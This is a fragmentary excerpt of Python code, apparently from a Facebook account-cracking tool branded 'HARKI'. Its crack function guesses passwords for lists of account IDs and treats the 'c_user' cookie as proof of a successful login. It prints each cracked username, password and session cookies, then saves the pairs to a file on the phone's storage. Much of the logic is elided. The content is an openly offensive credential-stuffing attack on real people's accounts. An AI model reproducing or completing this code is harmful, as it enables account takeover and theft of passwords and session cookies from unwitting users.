...
if datetime.now().date() < datetime(2024, 6, 13).date():
...
def crack(idf,pwv):
        ...
        sys.stdout.write(f"\r\x1b[1;94m[HARKI🌪️]\x1b[0;90m{Z}{b}{loop}{Z}|{b}{len(id)} \033[33m[\x1b[1;91mOK∙{ok}\33[1;96m {P}{'{:.0%}'.format(loop/float(len(id)))}"),
        sys.stdout.flush()
...
#                        if "checkpoint" in po.cookies.get_dict().keys():
                        if "c_user" in ses.cookies.get_dict().keys():
                                ...
                                print(f'\r\x1b[1;96m[ HARKI ]\n[✓] USER : {idf} \n[✓] PASS : {pw} \n[✓] COOKIES : {kuki}')
                                open('/sdcard/HARKI-𝑂𝐾.txt','a').write(idf+' | '+pw+'\n')
                                cek_SURCHY(kuki)
                                break
                        else:
                                continue
